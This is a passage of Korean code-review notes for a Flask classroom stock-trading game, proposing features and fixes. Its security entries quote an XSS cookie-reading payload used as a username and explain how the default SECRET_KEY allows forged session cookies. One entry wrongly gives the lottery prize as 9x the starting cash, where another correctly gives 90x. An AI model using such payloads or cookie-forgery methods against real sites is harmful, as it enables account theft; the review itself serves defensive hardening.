- **진행자 일시정지 시 이유 메시지 브로드캐스트** (`app.py:490-501`, `pause_room()`): 현재 참가자는 일시정지 배너에서 "⏸ 게임이 일시정지되었습니다"만 볼 수 있어 왜 멈췄는지 알 수 없음. `pause_room()` 요청 바디에 `reason` 파라미터를 추가하고 `room_dict()` 에 `pause_reason` 필드를 포함하면(`app.py:278-305`), `showPausedBanner()` (`app.js:653`)에서 "⏸ 일시정지 — 퀴즈 풀 시간입니다!" 식으로 이유를 표시 가능. `Room` 테이블 컬럼 추가 없이 in-memory dict(`_pause_reasons = {}`)로 구현해도 충분. 교실 진행 속도 향상.

- **참여자별 섹터 집중도 히트맵 (진행자용)** (`app.py:542-562`, `host_members()`): 진행자 rank 탭에서는 학생의 총 자산만 볼 수 있고, 어떤 섹터에 집중 투자했는지 알 수 없음. `GET /api/rooms/<rid>/host/sector-heatmap` 엔드포인트를 추가해 `RoomHolding.query.filter_by(room_id=rid).all()` 결과를 `섹터 × 학생` 2차원으로 집계하고, 프론트에서 CSS 배경색 강도로 시각화하면 "배터리 섹터에 절반이 몰렸네요"와 같은 수업 토론 소재가 즉시 생김. 기존 `loadHostMembers()` (`app.js:408`) 폴링에 히트맵 데이터를 함께 받는 파라미터 하나 추가로 구현 가능.

- **다중 예금 이율 — 단기/장기 분리** (`app.py:878-903`, `create_deposit()`): 현재 방 생성 시 단일 `deposit_rate`만 설정되어 모든 예금에 동일 이율 적용. "게임 종료까지 남은 시간 1/3 이상 유지 시 장기 이율 2배" 구조를 지원하면 학생이 유동성과 금리의 트레이드오프를 직접 체험 가능. `Room` 에 `deposit_rate_long` 컬럼(`app.py:31-40`의 ALTER TABLE 패턴 재활용)을 추가하고, `_end_room()` 이자 정산 시(`app.py:134-143`) 보유 기간 비율에 따라 이율을 분기하면 됨. `create_deposit()` 응답에 예상 장기/단기 이자를 함께 반환해 학생이 비교 가능.

- **게임 방 리셋 기능 (진행자)** (`app.py:519-537`, `_end_room()`): 같은 반을 대상으로 2라운드를 진행하려면 방을 새로 만들고 학생들이 QR을 다시 스캔해야 함. `POST /api/rooms/<rid>/reset` 엔드포인트를 추가해 `_end_room()` 과 유사하게 자산·보유·거래 기록을 초기화하되 `RoomMember` 는 유지하고 `room.status = 'waiting'`, `room.starting_cash` 로 현금 재지급하면 2라운드를 바로 시작 가능. 진행자만 호출 가능하고 `room.status == 'ended'` 인 경우에만 허용하도록 가드. 같은 코드 `room_code`를 유지하므로 학생들이 재접속 불필요.

- **개인 목표 수익률 달성 알림** (`app.js:735-753`, `refreshMyRank()`): `refreshMyRank()` 에서 매 10초마다 `me.total_value` 를 갱신하는 데이터를 이미 받고 있음. 학생이 게임 진입 직후 목표 수익률(예: +10%)을 입력하면 `localStorage`에 저장하고, 이후 폴링에서 달성 시 `navigator.vibrate([200,100,200])` + `new Notification('🎯 목표 달성!')` 을 발동할 수 있음. 브라우저 Notification API 퍼미션은 게임 진입 시 1회 요청. 화면을 다른 탭으로 전환한 학생도 결과를 즉시 인지 가능. 서버 변경 불필요, 프론트 20줄.

### 제거/단순화할 것들

- **`Room.query.get_or_404(rid)` deprecated 패턴 23곳 이상** (`app.py:435, 478, 493, 503, 519, 545, 568, 580, 589, 609, 631, 654, 673, 692, 727, 775, 809, 856, 878, 921, 939, 965, 998` 외): Flask-SQLAlchemy 3.x + SQLAlchemy 2.x 조합에서 `Model.query.get_or_404()` 는 내부적으로 LegacyQuery를 경유해 `SAWarning: Query.get() is deprecated` 경고를 발생시킴. `db.get_or_404(Room, rid)` (Flask-SQLAlchemy 3.0+ 신규 API)로 일괄 교체하면 경고 없이 동일 동작 유지. `sed -i 's/Room\.query\.get_or_404(rid)/db.get_or_404(Room, rid)/g' app.py` 수준의 기계적 변경 가능.

- **`withdraw_deposit()` 에서 `RoomMember` None 체크 누락 → AttributeError 500** (`app.py:912-916`): `m = RoomMember.query.filter_by(room_id=rid, user_id=user.id).first()` 후 곧바로 `m.cash += dep.amount` 실행. DB 데이터 불일치나 예외적인 강퇴 이후 상태에서 `m` 이 `None` 이면 `AttributeError: 'NoneType' object has no attribute 'cash'` 로 500 반환. `dep` 조회 직후(`app.py:907-908`) 동일 패턴으로 `if not m: return jsonify({'error': '참여자를 찾을 수 없습니다.'}), 403` 한 줄 추가로 해결.

- **`_do_reveal()` 에서 DB commit 이후에 in-memory 상태 설정 — 중복 상금 지급 위험** (`app.py:201-240`): `db.session.commit()` (line 221) 이후에 `cur['state'] = 'revealed'` (line 222) 를 설정하는 순서로 인해, commit 성공 후 서버 예외/재시작이 발생하면 in-memory 상태는 여전히 `'drawing'`으로 남음. 다음 `get_lottery()` 폴링에서 `_lottery_lock` 내부의 `if cur['state'] == 'drawing'` 조건을 재충족해 `_do_reveal()` 이 재호출되고, 이미 상금이 지급된 참가자에게 두 번째 상금이 지급됨. `cur['state'] = 'revealed'` 를 `db.session.commit()` 직전으로 이동해 commit 실패 시 `'drawing'` 상태를 유지, commit 성공 시 `'revealed'` 보장.

- **`get_history()` 에서 캐시 만료 후 차트 데이터가 완전히 재생성 — 교육 UX 심각 문제** (`stock_service.py:281-310`): `HISTORY_CACHE_TTL = 120` 초 만료 후 같은 종목·기간을 재요청하면 `random.gauss()` 로 처음부터 다른 히스토리를 생성하므로, 학생이 2분 간격으로 1달 차트를 보면 차트 모양이 완전히 달라져 투자 판단 근거가 사라짐. `_history_cache` TTL을 제거하고(`cached['ts']` 기준 비교 로직 삭제), 가격 변경 시(`get_price()`, `force_price()`) 해당 종목 캐시만 무효화하는 현재 패턴(`app.py line 187-189`)이 이미 있으므로 이를 확장해 "가격 변동이 없는 한 같은 히스토리 유지" 방식으로 전환하면 충분.

- **`_next_price()` 클램핑 범위와 `force_price()` 허용 범위 불일치** (`stock_service.py:139`, `stock_service.py:225`): 자연 변동은 `max(base * 0.6, min(base * 1.4, new_price))` — 기준가 ±40% 제한. `force_price()` 는 `max(base * 0.3, min(base * 3.0, new_price))` — 기준가 +200%/-70% 허용. 진행자가 강제로 +100% 올린 직후 (현재가 = `base * 2.0`) 다음 자연 변동 사이클에서 `_next_price()` 가 `current * (1 + drift)` 계산 후 `min(base * 1.4, ...)` 로 스냅해 한 틱 만에 -30% 폭락처럼 보이는 현상 발생. 클램프 기준을 `base` 대신 `current_price` 로 변경하거나(`current * 0.80, current * 1.20`), 최소한 자연 변동 클램프 범위를 `force_price()` 와 동일하게 확장해야 함.

- **`export_rankings()` 에서 `openpyxl` 를 함수 내 지연 import** (`app.py:1422-1424`): `import openpyxl`, `from io import BytesIO`, `from openpyxl.styles import Font, PatternFill, Alignment, Border, Side` 가 함수 바디 첫 줄에 위치. `openpyxl` 미설치 시 엔드포인트 호출 시점에 `ImportError` → 500 Internal Server Error 반환. 상단 모듈 수준 import로 이동하면 앱 기동 시 즉시 오류를 감지할 수 있어 Render 배포 후 첫 번째 Excel 다운로드에서 폭탄 맞는 상황 방지. `BytesIO` 는 표준 라이브러리이므로 항상 사용 가능하지만 `openpyxl` 은 선택 의존성이므로 `requirements.txt` 포함 여부도 CI에서 검증 필요.

---

## 2026-07-18

### 추가하면 좋을 기능

- **엑셀 결과 파일에 거래 내역 시트 추가** (`app.py:1419-1488`, `export_rankings()`): 현재 export는 최종 순위 단일 시트만 생성해 교사가 수업 후 "왜 이 학생이 1등을 했는지" 리뷰가 불가능. `openpyxl.Workbook()`에 두 번째 워크시트를 추가하고 `RoomTransaction.query.filter_by(room_id=rid).order_by(RoomTransaction.user_id, RoomTransaction.timestamp)` 결과를 삽입하면 학생별 의사결정 과정을 회고 수업에 활용할 수 있음. 기존 순위 시트에는 영향 없고 `export_rankings()` 함수 안에서 약 25줄 추가로 구현 가능.

- **게임 진행 중 참여자 강퇴 기능** (`app.py:564-575`, `kick_member()`): 현재 `room.status != 'waiting'`인 경우 강퇴 요청에 400을 반환해 수업 중 기기 오작동·중도 퇴장 학생을 제거할 방법이 없음. 별도 `POST /api/rooms/<rid>/host/members/<uid>/force-remove` 엔드포인트를 추가해 진행 중에도 `RoomMember` 삭제를 허용하고, 해당 학생의 보유 주식·예금을 현금으로 환원 처리해 순위에서 제외하면 됨.

- **퀴즈 쿨다운 남은 시간 카운트다운 표시 (참여자)** (`app.py:1257-1268`, `get_quiz()`): 퀴즈 제출 후 서버가 `cooldown` 초를 반환하고 있지만 참여자 UI에 "다음 퀴즈까지 N초" 타이머가 없어 학생이 반복 버튼을 누르거나 언제 재시도할 수 있는지 모름. `submit_quiz()` 응답의 `cooldown` 값을 받아 `setInterval`로 UI 카운트다운을 표시하는 프론트 20줄 이하 변경으로 UX가 크게 개선됨. 서버 변경 불필요.

- **자동 복권 발동 일정을 진행자 UI에 표시** (`app.py:171-199`, `_lot_round_due()`): 30분 게임에서 1/3·2/3 지점에 2회, 90분 게임에서 4회 자동 복권이 발동되는 규칙이 코드에만 존재하고 진행자에게 노출되지 않음. `room_dict()` (`app.py:278-305`)에 `lottery_schedule` 필드를 추가해 예상 발동 경과 시간 목록(예: `[600, 1200]`초)을 반환하거나, 설정 탭에 "예상 복권 발동: 10분·20분" 안내를 추가하면 교사가 수업 계획을 세우기 용이해짐.

- **파산 위기 참여자 진행자 화면 경고 표시** (`app.py:552-562`, `host_members()`): 참여자 총자산이 시작 자금의 5% 미만으로 떨어져도 진행자 순위표에 아무런 시각적 구분이 없음. `host_members()` 응답의 각 항목에 `at_risk: bool` 플래그(예: `total < room.starting_cash * 0.05`)를 추가하고 `app.js:417` 의 순위표 렌더링에서 `⚠️` 아이콘을 붙이면 교사가 해당 학생에게 즉시 개입 가능. 서버 3줄·프론트 5줄 수준.

### 제거/단순화할 것들

- **`member_total_value()` N+1 쿼리 구조** (`app.py:107-118`): `get_rankings()` (`app.py:815`)와 `host_members()` (`app.py:552`)가 멤버 루프 안에서 각각 `member_total_value()`를 호출하고, `member_total_value()` 내부에서 `RoomHolding`·`Deposit` 쿼리를 개별 실행함. 30명 참여 시 순위 조회 1회에 최소 61개 SQL이 발생. `RoomHolding.query.filter_by(room_id=rid).all()`과 `Deposit.query.filter_by(room_id=rid, status='active').all()`을 루프 밖에서 한 번씩 조회해 `user_id → list` 딕셔너리로 그룹핑하면 쿼리 수가 3개 고정으로 감소함.

- **`S.assetHistory` 배열 무제한 증가 (메모리 누수)** (`app.js:19`, `S.assetHistory = []`): 참여자 게임에서 10초마다 `refreshMyRank()`가 `S.assetHistory.push(entry)`를 실행해 배열이 끝없이 커짐. 60분 게임에서 360개이지만 180분·일시정지 반복 시 수천 개로 증가해 자산 그래프 렌더링이 느려짐. `S.assetHistory.push(entry); if (S.assetHistory.length > 200) S.assetHistory.shift();` 한 줄로 최근 200틱만 유지하는 환형 버퍼로 전환하면 충분.

- **`get_chart()` 의 `interval` 파라미터가 `StockService.get_history()`에서 완전 미사용** (`app.py:715-719`, `stock_service.py:292`): `get_chart()`에서 `(yp, yi)`를 추출해 `get_history(symbol, period=yp, interval=yi)`에 전달하지만, `get_history()`는 `interval` 인자를 받되 `n_bars` 결정에 `period`만 사용하고 `interval`은 무시함. 추후 구현 계획이 없다면 `get_history()` 시그니처에서 `interval` 파라미터를 제거하고, `get_chart()` 에서도 `interval` 변수를 삭제해 호출 의도를 명확히 해야 함.

- **`minigame_close()` 에서 `_rlt_lock` 보유 중 `_end_room()` 호출** (`app.py:965-994`): `_rlt_lock` 내부(`with _rlt_lock:` 블록 안)에서 `_end_room(room)`이 호출되는데, `_end_room()`은 DB commit, `cleanup_room_service()`, `_invalidate_room_cache()` 등 무거운 작업을 포함함. 락 점유 시간이 길어지면 동시에 `/minigame/open`을 호출하는 학생이 블록됨. `should_end = True` 플래그를 락 내부에서 결정하고 `_end_room()`은 락 블록 바깥(`with` 블록 이후)에서 호출하도록 리팩터링해야 함.

- **`Room.code` 충돌 재시도 소진 후 중복 코드 반환** (`models.py:8-13`): `gen_code()`가 10회 재시도 후에도 충돌하면 중복 코드를 그대로 반환하고, `create_room()`(`app.py:388`)의 `db.session.commit()` 시점에 `IntegrityError`가 발생해 500 오류가 반환됨. `Room.query.filter_by(code=code).first()` 체크가 이미 있으므로 재시도 횟수를 50으로 늘리거나 코드 길이를 8자로 확장해 충돌 확률(`62^6 ≈ 5.6억` → `62^8 ≈ 2,183억`)을 대폭 낮추는 것이 근본 해결책. 최소한 `create_room()`에서 `IntegrityError`를 잡아 사용자 친화 메시지로 반환해야 함.

---

## 2026-07-19

### 추가하면 좋을 기능

- **포트폴리오 보유 종목 카드에서 직접 매도 버튼** (`app.js:1481+`, `pg-portfolio` → `holdings-list`): 현재 보유 종목을 팔려면 포트폴리오 탭 → 시장 탭으로 이동 → 종목 검색 → 모달 열기 → 매도 순서를 거쳐야 함. `loadPortfolio()` 내 보유 종목 카드 렌더링에서 각 항목에 `onclick="openStockModal('${h.symbol}', h)"` 버튼을 추가하면 2탭 이동 없이 즉시 매도 가능. `openStockModal()`의 두 번째 인수(fallback)는 이미 구현되어 있음(`app.js:1327`). 서버 변경 없이 프론트 수정만으로 구현.

- **Render 서버 재시작 후 진행자 설정 소실 방지** (`app.py:1245-1246`, `app.py:250`, `app.py:1246`): `_quiz_settings`, `_roulette_config`, `_quiz_state` 세 딕셔너리가 모두 in-memory 전역 변수로 존재. Render free tier는 30분 비활성 후 컨테이너를 재시작하므로 게임 도중 cold start 발생 시 진행자가 설정한 퀴즈 보상%, 룰렛 배율/확률이 모두 기본값으로 초기화됨. `_lottery_rounds_done`처럼 `Room` 테이블에 `quiz_reward_pct`, `quiz_penalty_pct`, `rlt_config JSON` 컬럼을 추가하거나, 별도 `RoomSettings` 모델로 DB에 영속화해야 수업 중 서버 재시작에도 설정이 유지됨.

- **자동 복권 기본 상금 과대 설정 조정 가능하게** (`app.py:419`): 자동 복권 발동 시 `default_prize = member_count * 30_000_000` 으로 고정됨. 30명 학급에서 1회당 9억 원 상금이 자동 배정되어 10,000,000원 시작 자금에 비해 최대 9배 상금이 나올 수 있음. 복권이 투자 결과를 압도해 게임의 교육적 균형이 깨짐. `host_news_interval()`처럼 진행자가 자동 복권의 인당 기본 상금 배수를 설정할 수 있는 엔드포인트 (`GET/POST /api/rooms/<rid>/host/lottery-config`)를 추가하고, `Room` 모델에 `lottery_default_prize_per_person` 컬럼을 두어 게임 생성 시 지정 가능하게 만드는 것이 좋음.

- **Flask SECRET_KEY 기본값 보안 취약점 경고** (`app.py:13`): `app.secret_key = os.environ.get('SECRET_KEY', 'mock-stock-game-secret-2024')`에서 `SECRET_KEY` 환경 변수를 설정하지 않으면 소스 코드에 공개된 고정 문자열을 사용함. Flask 세션은 서버 측이 아닌 클라이언트 쿠키에 HMAC 서명으로 저장되므로, 시크릿 키를 알고 있는 공격자가 임의 `user_id`를 가진 위조 세션 쿠키를 생성해 다른 참여자로 위장 가능함. Render 환경 변수에 충분히 긴 랜덤 값을 반드시 설정해야 하며, 최소한 `app.py` 시작 시 `if app.secret_key == 'mock-stock-game-secret-2024': print("WARNING: SECRET_KEY is using default value!")`를 로깅해 경고를 띄워야 함.

- **룰렛 자동닫기 타이머가 스핀 애니메이션 중에도 진행** (`app.js:975-990`, `_startRltAutoClose()`): 룰렛 모달 열림과 동시에 60초 카운트다운이 시작됨. 학생이 배팅하고 `doRouletteSpin()`이 4.3초 애니메이션(`app.js:1062`)을 실행 중일 때 타이머가 0초에 도달하면 `closeRoulette()`를 강제 호출해 결과 확인 전에 모달이 닫힐 수 있음. `doRouletteSpin()` 진입 시 `_stopRltAutoClose()` 호출 후 결과 표시 이후 다시 `_startRltAutoClose()`로 재시작하거나, 스핀 중에는 카운트다운을 완전히 정지하도록 `app.js:1040` 직후에 `_stopRltAutoClose()`를 추가해야 함.

### 제거/단순화할 것들

- **룰렛·퀴즈 오답 패널티 주식 강제 매도 후 0주 보유 종목이 DB에 남음** (`app.py:1036-1038`, `app.py:1318`): 룰렛 베팅 자금 마련 시 `h.shares = 0; h.avg_price = 0`을 설정하지만 `db.session.delete(h)`를 호출하지 않음. 퀴즈 오답 패널티 경로(`app.py:1315-1318`)도 동일. 일반 매도 경로(`app.py:762`)는 `if holding.shares == 0: db.session.delete(holding)` 처리가 있음. 0주 보유 레코드는 `get_portfolio()`에서 필터링(`if h.shares <= 0: continue`, `app.py:783`)되어 화면에는 안 보이지만 DB에 누적되어 저장 공간 낭비·쿼리 성능 저하 발생. 두 경로 모두 `if h.shares == 0: db.session.delete(h)` 한 줄 추가로 수정 가능.

- **`get_history()` 차트 데이터가 과거→현재 방향 랜덤워크가 아닌 역방향 생성** (`stock_service.py:293-308`): 루프가 `range(n_bars, 0, -1)` 역순으로 날짜를 할당하면서 가격은 `price = c` 즉 순방향으로 누적함. 그 결과 `n_bars`일 전 날짜에 현재가와 거의 같은 시작가를 놓고, 마지막 날(오늘)에 가장 많이 벗어난 값이 놓일 수 있음. 날짜 인덱스와 가격 랜덤워크 방향이 반대여서 차트가 현재가에서 거꾸로 거슬러 올라가는 모양이 됨. `price`를 `current * random.uniform(0.8, 1.1)`로 과거 시작가를 먼저 결정한 뒤 순방향으로 바(bar)를 생성하면(`for i in range(n_bars):`로 방향 수정) 투자 차트의 시간 흐름이 직관적으로 표현됨.

- **`_quiz_state` 딕셔너리가 `_end_room()` 에서 부분적으로만 정리** (`app.py:159-160`): `for k in [k for k in _quiz_state if k[0] == room.id]: del _quiz_state[k]` 로 해당 방의 키는 삭제되나, 그 외 `_lots`, `_rlt_active`, `_roulette_config` 정리 역시 분산 처리됨 (`app.py:155-160`). 특히 서버 재시작 없이 같은 진행자가 방을 여러 번 만들 경우 이전 방의 `_quiz_state` 키가 남아 메모리가 누적됨 (ended 상태 방은 정리되지만 waited → ended 빠른 종료 시 `_quiz_state[rid]` 미초기화로 인한 KeyError 가능). `_end_room()`의 메모리 정리 로직을 `_cleanup_room_memory(room_id)` 헬퍼 함수로 통합하면 누락 방지 및 코드 가독성 개선.

- **`enter()` 엔드포인트에서 닉네임 중복 시 기존 사용자 그대로 반환 — 학번·이름 재사용 위험** (`app.py:329-342`): `User.query.filter_by(username=u).first()`로 같은 닉네임 존재 시 해당 User를 반환하여 세션을 설정함. 한 학급에서 학번·이름 조합이 실수로 겹치거나 다른 학생이 같은 이름으로 참여하면 이미 게임 중인 다른 학생의 계정을 탈취하게 됨. `username`을 전역 고유키로 쓰는 현 구조를 방별 `RoomMember.display_name`으로 분리하거나, 최소한 동일 닉네임 존재 시 `{'error': '이미 사용 중인 학번/이름 조합입니다.'}` 오류를 반환하여 중복 방지 처리가 필요함.

- **호스트 게임 화면에서 룰렛 설정(`loadRltConfig()`)을 불필요하게 항상 호출** (`app.js:267`, `enterHostGame()`): `enterHostGame()`은 항상 `loadRltConfig()`를 호출하며, 이는 `/api/rooms/<rid>/host/roulette-config` GET 요청을 발생시킴. 하지만 룰렛 설정 탭은 진행자가 명시적으로 "설정" 탭을 선택해야 보임. `loadRltConfig()`를 `enterHostGame()` 진입 시가 아닌 `switchHostTab('settings')` 진입 시(`app.js:303-312`의 `if (tab === 'settings')` 분기)로 이동하면 불필요한 초기 API 호출 1회를 줄일 수 있음.

---

## 2026-07-19 (2차)

### 추가하면 좋을 기능

- **게임 내 실시간 가격 히스토리 기록 및 차트 반영** (`stock_service.py:174-190`, `get_price()`): 현재 `get_history()`(`stock_service.py:281-310`)는 가격 조회 시마다 랜덤워크로 차트 데이터를 새로 생성해 게임 중 실제 변동한 주가와 전혀 무관한 차트가 표시됨. `StockService.__init__()`에 `self._price_history: dict = {sym: [] for sym in STOCKS}` 추가, `get_price()`의 가격 갱신 시(`stock_service.py:185`) `self._price_history[sym].append((now, new_price))` + 최대 500개 유지 로직을 추가하고, `get_history()`에서 내부 히스토리가 충분할 때 우선 반환하도록 수정. 학생이 실제 게임 가격 흐름을 차트로 보며 매수 타이밍을 분석할 수 있어 교육적 가치가 크게 향상됨.

- **호스트 전체 참가자 공지 브로드캐스트 기능** (신규 `app.py` 엔드포인트 2개, `app.js:613`): 진행자가 수업 중 모든 참여자 화면에 텍스트 공지를 즉시 띄우는 기능. `POST /api/rooms/<rid>/host/broadcast`(메시지 저장) + `GET /api/rooms/<rid>/broadcast`(타임스탬프+메시지 반환) 추가 후, 참여자 10초 폴링(`app.js:613`) 내에서 타임스탬프 비교해 새 메시지 도착 시 5초 배너 표시. 현재는 뉴스 헤드라인(섹터 방향 힌트)만 전송 가능해 교사가 학생에게 직접 전략 힌트("지금 분산투자를 시도해보세요!")를 전달할 방법이 없음. `Room` 테이블에 `broadcast_msg VARCHAR(200)`, `broadcast_ts FLOAT` 컬럼 추가로 구현 가능.

- **Watchlist 관심 종목 급등락 자동 토스트 알림** (`app.js:1257-1285`, `filterStocks()`, `S.watchlist`): 현재 Watchlist(`app.js:17`)는 시장 탭 필터링에만 사용됨. `filterStocks()` 내부에서 watchlist 종목의 `change_pct`가 ±5% 초과 시 자동 toast 알림을 발송하는 로직(15줄 내외)을 추가하고 `S.watchlistAlerted = new Set()`으로 중복 방지. 서버 변경 없이 클라이언트 전용 구현. 학생이 포트폴리오나 예금 탭에 있을 때도 관심 종목의 큰 움직임을 놓치지 않아 능동적 투자 결정을 유도하는 UX 개선 효과.

- **게임 종료 결과 화면에 섹터별 수익 기여 분석** (`app.py:808-823`, `screen-results`, `loadResults()`): 최종 결과 화면에 "어느 섹터 투자가 수익을 냈는가" 집계 표시. `GET /api/rooms/<rid>/results/analytics` 신규 엔드포인트에서 `RoomTransaction.query.filter_by(room_id=rid, action='SELL')` 결과에 `STOCKS[t.symbol]['sector']`를 조인해 섹터별 실현손익 합계를 반환(약 25줄). 호스트 결과 화면의 `loadResults()`에서 호출해 Chart.js 도넛으로 렌더링. "IT 섹터 투자가 평균 +18%" 같은 통계로 수업 후 전략 리뷰 토론을 구조화 가능.

- **진행자 로비 예상 인원 기반 접속 완료 감지** (`app.js:186-232`, `enterHostLobby()`): 교사가 로비에서 예상 학생 수를 입력하는 `<input type="number" id="expected-count">` 필드 추가, `loadLobbyMembers()` 완료 후 `data.length >= expectedCount`이면 "✅ 모든 학생 접속 완료!" 강조 표시 + Web Audio API 비프음 1회(3줄). 현재는 교사가 학생을 눈으로 세거나 구두로 확인해야 하는 불편이 있음. `enterHostLobby()`에 필드 추가와 `loadLobbyMembers()` 하단 조건문 5줄로 구현 가능하며 서버 변경 불필요.

### 제거/단순화할 것들

- **`datetime.utcnow()` Python 3.12 deprecation 경고 전체 미대응** (`app.py:125, 279, 437, 458, 497, 511, 1102`): Python 3.12부터 `datetime.utcnow()`는 DeprecationWarning을 발생시키고 Python 3.14에서 제거 예정. `app.py` 전체에서 17회 이상 사용됨. `from datetime import timezone`이 이미 `app.py:3`에 import되어 있으므로 DB 저장용 naive datetime이 필요한 곳은 `datetime.now(timezone.utc).replace(tzinfo=None)`으로, 순수 비교·연산은 `datetime.now(timezone.utc)`로 일괄 교체 가능. 특히 `_end_room()`(`app.py:125`)·`room_dict()`(`app.py:279`) 처럼 `now = datetime.utcnow()`로 시작하는 함수들이 주요 교체 대상.

- **`RoomMember.cash` · `Deposit.amount` · `RoomTransaction.amount` Float 타입의 부동소수점 누적 오차** (`models.py:52, 77, 87`): 원화(정수)를 `db.Column(db.Float)` (IEEE 754 배정밀도)로 저장하면 `10_000_000 * 0.025 = 250000.00000000003` 같은 미세 오차가 거래마다 누적됨. 30회 거래 후 `member.cash`가 `9,998,721.999999998` 같은 값이 될 수 있고, `krw()` 함수(`app.js:48`)의 `Math.round()` 처리로 화면은 괜찮지만 `member.cash < amount` 비교(`app.py:748`) 등에서 경계값 오류가 발생 가능. `db.Column(db.Numeric(precision=15, scale=0))` 또는 `Integer`(원 단위 정수 저장)로 교체하고 마이그레이션 블록(`app.py:31-40`)에 ALTER 문 추가 권장.

- **`get_room()` 에서 `cur_user()` 최대 4회 중복 호출** (`app.py:439, 444, 464, 473`): `get_room(rid)` 함수 내부에서 `cur_user()`(`= db.session.get(User, session['user_id'])`)가 조건 분기에 따라 최대 4회 호출됨. SQLAlchemy identity map이 두 번째 이후를 캐싱하지만 `cur_user().id`는 `session['user_id']`로 직접 대체 가능하고, 함수 진입부에서 `uid = session['user_id']`(또는 `user = cur_user()`) 1회 선언 후 재사용하는 것이 코드 의도를 명확히 함. `room_dict(room, cur_user().id)` 패턴을 `room_dict(room, uid)`로 통일하면 가독성과 함께 identity map 미초기화 엣지케이스도 방지됨.

- **룰렛 트리거 시 `has_spins` 체크가 참여자 수만큼 COUNT 쿼리 실행** (`app.py:450-455`): `any(RoomTransaction.query.filter_by(room_id=rid, user_id=m.user_id, action='RLT').count() < 3 for m in non_host)`는 참여자 수 N만큼 개별 `COUNT(*)` SQL을 발행함. 게임 종료 5초 전 30명 클라이언트가 동시에 `/api/rooms/<rid>`를 폴링하면 한 요청당 30개 COUNT + 30 요청 = 최대 900개 동시 COUNT 쿼리 가능. `db.session.query(db.func.count(RoomTransaction.id)).filter(RoomTransaction.room_id == rid, RoomTransaction.action == 'RLT').group_by(RoomTransaction.user_id).all()` 단일 쿼리로 집계 후 `any(cnt[0] < 3 for cnt in result)` 판단으로 교체하면 쿼리 수가 1개로 고정.

- **`loadLobbyMembers()` · `loadPLobbyMembers()` username을 HTML escaping 없이 innerHTML에 삽입** (`app.js:224-231, 582-585`): `${m.username}` 그대로 innerHTML에 삽입하고, onclick 속성에서 작은따옴표만 `replace(/'/g,"\\'")`로 처리. `<img src=x onerror=alert(document.cookie)>` 같은 username이 등록되면 호스트·참가자 로비에서 XSS 공격 가능(`app.py:332`의 username 유효성 검사는 길이 2-30자만 확인). `app.js:897`에 이미 `escHtml()` 헬퍼가 정의되어 있으므로 username 출력 전 `escHtml(m.username)` 적용으로 즉시 해결 가능. onclick 속성 내 username은 `data-uid` 속성으로 이동하거나 user_id 만으로 대체하는 방향이 근본 해결.

- **`_do_reveal()` 에서 동일 `Room` 객체를 중복 DB 조회** (`app.py:226-233`): `_room_lot = db.session.get(Room, rid)` 로 조회 후 `auto_paused` 블록에서 `room = db.session.get(Room, rid) if _room_lot is None else _room_lot`를 실행. `_room_lot`이 None인 경우 두 번째 `db.session.get(Room, rid)`도 identity map에서 None을 반환하므로 무의미한 중복 조회. `room = _room_lot`으로 단순화하고 `if room and room.status == 'paused' and room.paused_at:` 가드만 유지하면 코드 의도가 명확해지고 비정상 상황에서의 불필요한 DB 왕복도 제거됨.

---

## 2026-07-20

### 추가하면 좋을 기능

- **Page Visibility API를 활용한 백그라운드 폴링 스로틀링** (`app.js:269-273`, `app.js:562-575`): 참여자 폴링 간격이 5초, 호스트가 10초로 고정. 학생이 스마트폰에서 게임 탭을 백그라운드로 전환해도 폴링이 계속 실행됨. `document.addEventListener('visibilitychange', ...)` 리스너 추가 후 `document.hidden` 시 `clearInterval(S.pollInterval)`, 탭 복귀 시 즉시 재시작하면 30명 클래스에서 불필요한 서버 요청을 최대 50% 절감 가능. 서버 변경 불필요, `startPolling()` 래퍼 함수(약 10줄)로 구현.

- **게임 진행 중 참여자 강퇴 기능** (`app.py:564-575`, `app.py:567`): `kick_member()`가 `if room.status != 'waiting': return error`를 반환해 게임 중에는 퇴장 처리 불가. 실제 수업에서 부정행위(스크립트 자동 매매 등)를 발견한 교사가 해당 학생을 제거할 방법이 없음. `status='waiting'` 조건을 제거하고 대신 게임 중 강퇴 시 해당 학생의 `RoomMember` 레코드를 삭제(또는 `is_kicked` 플래그)하되 거래 내역은 보존하는 방식으로 수정. 진행자 순위 탭 `host-member-row`(`app.js:413-428`)에 게임 중 강퇴 버튼도 노출.

- **엑셀 내보내기에 섹터별 거래 요약 시트 추가** (`app.py:1418-1488`): 현재 엑셀은 '최종 순위' 시트 1개만 포함. `RoomTransaction.query.filter_by(room_id=rid)`를 `STOCKS[t.symbol]['sector']`로 그룹화해 학생별·섹터별 실현손익을 두 번째 시트로 추가(약 40줄). 교사가 수업 후 "IT 섹터 집중 투자 vs 분산 투자" 등 전략 비교 리뷰 시 바로 활용 가능. `openpyxl`이 이미 의존성으로 있어 추가 패키지 불필요.

- **게임 중 참여자 자산 스냅샷 주기 저장** (`app.py:808-824`, `models.py`): 현재 `asset_history`(`app.js:19`, `app.js:697`)는 클라이언트가 폴링할 때만 총 자산을 로컬 배열에 누적해 자산 변화 라인 차트를 그림. 클라이언트가 탭을 닫거나 새로고침하면 히스토리가 소멸. `AssetSnapshot(room_id, user_id, total_value, ts)` 모델을 추가하고 `/api/rooms/<rid>/rankings` 응답 시 서버가 각 멤버의 스냅샷을 INSERT하면, 재접속 후에도 차트 복원이 가능하고 종료 후 "자산 변화 곡선 비교" 기능도 구현 가능. 5분 간격 저장 시 30분 게임 기준 멤버당 최대 6행.

- **복권 자동 상금 배수 설정 엔드포인트** (`app.py:419`, `app.py:630-646`): 자동 복권 발동 시 `default_prize = member_count * 30_000_000` 하드코딩. 30명 클래스에서 회당 9억 원 상금이 생성되어 1,000만 원 시작 자금 대비 최대 90배 상금이 가능함 — 복권이 투자 결과를 압도해 교육 효과가 훼손됨. `host_news_interval()`과 동일 패턴으로 `GET/POST /api/rooms/<rid>/host/lottery-config` 엔드포인트를 추가해 `prize_per_person`(기본 값 1,000,000원 등)을 설정 가능하게 하고, `Room` 테이블 컬럼 또는 in-memory dict로 저장.

### 제거/단순화할 것들

